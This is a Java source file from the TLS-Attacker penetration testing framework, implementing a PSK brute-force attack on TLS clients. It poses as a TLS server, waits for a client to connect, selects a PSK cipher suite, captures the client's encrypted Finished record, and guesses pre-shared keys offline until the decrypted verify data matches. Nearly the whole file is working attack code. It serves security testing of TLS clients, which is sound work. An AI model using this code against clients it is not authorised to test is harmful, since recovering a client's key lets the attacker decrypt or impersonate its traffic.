/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.bruteforce.GuessProvider;
import de.rub.nds.tlsattacker.attacks.bruteforce.GuessProviderFactory;
import de.rub.nds.tlsattacker.attacks.config.PskBruteForcerAttackClientCommandConfig;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.CipherSuite;
import de.rub.nds.tlsattacker.core.constants.HandshakeByteLength;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.PRFAlgorithm;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.crypto.PseudoRandomFunction;
import de.rub.nds.tlsattacker.core.exceptions.CryptoException;
import de.rub.nds.tlsattacker.core.protocol.handler.ClientKeyExchangeHandler;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.HandshakeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.core.record.Record;
import de.rub.nds.tlsattacker.core.record.cipher.RecordCipher;
import de.rub.nds.tlsattacker.core.record.cipher.RecordCipherFactory;
import de.rub.nds.tlsattacker.core.record.cipher.cryptohelper.KeySet;
import de.rub.nds.tlsattacker.core.record.cipher.cryptohelper.KeySetGenerator;
import de.rub.nds.tlsattacker.core.record.crypto.RecordDecryptor;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.state.TlsContext;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.MessageAction;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.TlsAction;
import de.rub.nds.tlsattacker.core.workflow.action.executor.WorkflowExecutorType;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 *
 */
public class PskBruteForcerAttackClient extends Attacker<PskBruteForcerAttackClientCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private GuessProvider guessProvider;

    /**
     *
     * @param config
     * @param baseConfig
     */
    public PskBruteForcerAttackClient(PskBruteForcerAttackClientCommandConfig config, Config baseConfig) {
        super(config, baseConfig);
    }

    @Override
    public void executeAttack() {
        guessProvider = GuessProviderFactory.createGuessProvider(config.getGuessProviderType(),
                config.getGuessProviderInputStream());
        State state = executeHandshakeWithClient();
        if (state != null) {
            Record encryptedRecord = getEncryptedRecordFormClient(state);
            if (encryptedRecord != null) {
                boolean result = false;
                CONSOLE.info("Got a client connection - starting to guess the PSK. Depending on the Key this may take some time...");
                long startTime = System.currentTimeMillis();
                int counter = 0;
                while (!result) {
                    byte[] guess = guessProvider.getGuess();
                    counter++;
                    if (guess == null) {
                        CONSOLE.info("Could not find psk - attack stopped");
                        return;
                    } else {
                        if (LOGGER.isDebugEnabled()) {
                            LOGGER.debug("Testing: " + ArrayConverter.bytesToHexString(guess));
                        }
                    }
                    try {
                        result = tryPsk(guess, encryptedRecord, state);

                        if (result) {
                            long stopStime = System.currentTimeMillis();
                            CONSOLE.info("Found the psk in "
                                    + String.format(
                                            "%d min, %d sec",
                                            TimeUnit.MILLISECONDS.toMinutes(stopStime - startTime),
                                            TimeUnit.MILLISECONDS.toSeconds(stopStime - startTime)
                                                    - TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS
                                                            .toMinutes(stopStime - startTime))));
                            CONSOLE.info("Guessed " + counter + " times");
                        }
                    } catch (NoSuchAlgorithmException ex) {
                        LOGGER.debug(ex);
                        LOGGER.warn("This Algorithm is not implemented yet!");
                        break;
                    } catch (CryptoException c) {
                        LOGGER.trace("Decryption failed", c);
                    }
                }
            } else {
                LOGGER.warn("Could not find the EncryptedRecord - attack stopped");
            }
        } else {
            LOGGER.warn("Did not receive ClientHello - attack stopped");
        }
    }

    private State executeHandshakeWithClient() {
        Config tlsConfig = getTlsConfig();
        tlsConfig.setWorkflowExecutorShouldClose(false);
        CONSOLE.info("Started TLS-Server - waiting for a client to connect...");
        State state = executeClientHelloWorkflow(tlsConfig);
        if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.CLIENT_HELLO, state.getWorkflowTrace())) {
            CipherSuite suite = choosePskCipherSuite(state.getTlsContext().getClientSupportedCiphersuites());
            tlsConfig.setDefaultSelectedCipherSuite(suite);
        } else {
            try {
                state.getTlsContext().getTransportHandler().closeConnection();
            } catch (IOException ex) {
                LOGGER.warn("Could not close client connection", ex);
            }
        }
        tlsConfig.setEnforceSettings(true);
        continueProtocolFlowToClient(state);
        return state;
    }

    private Record getEncryptedRecordFormClient(State state) {
        if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, state.getWorkflowTrace())) {
            if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, state.getWorkflowTrace())) {
                return (Record) WorkflowTraceUtil.getLastReceivedRecord(state.getWorkflowTrace());
            }
            LOGGER.debug("Could not find encrypted record");
            return null;
        } else {
            CONSOLE.info("Client uses the default PSK: "
                    + ArrayConverter.bytesToHexString(state.getConfig().getDefaultPSKKey()));
            return null;
        }
    }

    private CipherSuite choosePskCipherSuite(List<CipherSuite> cipherSuiteList) {
        for (CipherSuite suite : cipherSuiteList) {
            if (suite.isPsk()) {
                return suite;
            }
        }
        return null;
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        Config tlsConfig = getTlsConfig();
        CONSOLE.info("Started TLS-Server - waiting for a client to Connect...");
        State state = executeClientHelloWorkflow(tlsConfig);
        TlsContext tlsContext = state.getTlsContext();
        if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.CLIENT_HELLO, state.getWorkflowTrace())) {
            for (CipherSuite cipherSuite : tlsContext.getClientSupportedCiphersuites()) {
                if (cipherSuite.isPsk()) {
                    CONSOLE.info("The Client uses Psk. If he uses a weak Password he is vulnerable.");
                    return null;
                }
            }
            CONSOLE.info("The Client is not supporting Psk.");
            return false;

        } else {
            CONSOLE.info("Did not receive a ClientHello Message - check the Debug output!");
            return false;
        }
    }

    private void continueProtocolFlowToClient(State state) {
        TlsAction clientHelloAction = state.getWorkflowTrace().getTlsActions().get(0);
        WorkflowTrace trace = new WorkflowConfigurationFactory(state.getConfig()).createWorkflowTrace(
                WorkflowTraceType.HANDSHAKE, RunningModeType.SERVER);
        trace.removeTlsAction(0);// Remove clienthello action
        trace.removeTlsAction(trace.getTlsActions().size() - 1);
        state.getWorkflowTrace().removeTlsAction(0);
        state.getConfig().setWorkflowExecutorShouldClose(true);
        state.getConfig().setWorkflowExecutorShouldOpen(false);
        for (TlsAction action : trace.getTlsActions()) {
            state.getWorkflowTrace().addTlsAction(action);
        }
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                WorkflowExecutorType.DEFAULT, state);
        workflowExecutor.executeWorkflow();
        // Glue client hello action back on
        state.getWorkflowTrace().addTlsAction(0, clientHelloAction);
    }

    private State executeClientHelloWorkflow(Config tlsConfig) {
        WorkflowConfigurationFactory factory = new WorkflowConfigurationFactory(tlsConfig);
        WorkflowTrace trace = factory.createTlsEntryWorkflowtrace(tlsConfig.getDefaultClientConnection());
        trace.addTlsAction(new ReceiveAction(new ClientHelloMessage()));
        State state = new State(tlsConfig, trace);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                WorkflowExecutorType.DEFAULT, state);
        workflowExecutor.executeWorkflow();
        return state;
    }

    private void computeMasterSecret(TlsContext tlsContext, WorkflowTrace trace) {
        ClientKeyExchangeMessage clientKeyExchangeMessage = (ClientKeyExchangeMessage) WorkflowTraceUtil
                .getFirstReceivedMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
        ClientKeyExchangeHandler handler = (ClientKeyExchangeHandler) clientKeyExchangeMessage.getHandler(tlsContext);
        handler.getPreparator(clientKeyExchangeMessage).prepareAfterParse(false);
        tlsContext.setPreMasterSecret(clientKeyExchangeMessage.getComputations().getPremasterSecret().getValue());
        handler.adjustPremasterSecret(clientKeyExchangeMessage);
        handler.adjustMasterSecret(clientKeyExchangeMessage);
    }

    private boolean tryPsk(byte[] guessedPsk, Record encryptedRecord, State state) throws CryptoException,
            NoSuchAlgorithmException {
        state.getConfig().setDefaultPSKKey(guessedPsk);
        computeMasterSecret(state.getTlsContext(), state.getWorkflowTrace());
        byte[] controlValue = computeControlValue(state.getWorkflowTrace(), state.getTlsContext());
        KeySet keySet = KeySetGenerator.generateKeySet(state.getTlsContext());
        RecordCipher recordCipher = RecordCipherFactory.getRecordCipher(state.getTlsContext(), keySet);
        RecordDecryptor dec = new RecordDecryptor(recordCipher, state.getTlsContext());
        dec.decrypt(encryptedRecord);
        byte[] receivedVrfyData = Arrays.copyOfRange(
                encryptedRecord.getComputations().getPlainRecordBytes().getValue(), 0, controlValue.length);
        LOGGER.debug("Received Data " + ArrayConverter.bytesToHexString(receivedVrfyData));
        LOGGER.debug("Control Data " + ArrayConverter.bytesToHexString(controlValue));
        if (Arrays.equals(receivedVrfyData, controlValue)) {
            CONSOLE.info("Found PSK: " + ArrayConverter.bytesToHexString(guessedPsk));
            return true;
        } else {
            return false;
        }
    }

    private byte[] computeControlValue(WorkflowTrace trace, TlsContext tlsContext) throws CryptoException {
        tlsContext.getDigest().reset();
        for (MessageAction messageAction : trace.getMessageActions()) {
            for (ProtocolMessage message : messageAction.getMessages()) {
                if (message instanceof ChangeCipherSpecMessage) {
                    break;
                }
                if (message.isHandshakeMessage()) {
                    HandshakeMessage handshakeMessage = (HandshakeMessage) message;
                    if (handshakeMessage.getIncludeInDigest()) {
                        tlsContext.getDigest().append(message.getCompleteResultingMessage().getValue());
                    }
                }
            }
        }

        byte[] handshakeMessageHash = tlsContext.getDigest().digest(tlsContext.getSelectedProtocolVersion(),
                tlsContext.getSelectedCipherSuite());
        PRFAlgorithm prfAlgorithm = tlsContext.getChooser().getPRFAlgorithm();
        byte[] control = PseudoRandomFunction.compute(prfAlgorithm, tlsContext.getMasterSecret(),
                PseudoRandomFunction.CLIENT_FINISHED_LABEL, handshakeMessageHash, HandshakeByteLength.VERIFY_DATA);
        byte[] compare = ArrayConverter.concatenate(HandshakeMessageType.FINISHED.getArrayValue(),
                ArrayConverter.intToBytes(control.length, HandshakeByteLength.MESSAGE_LENGTH_FIELD), control);
        return compare;
    }
}
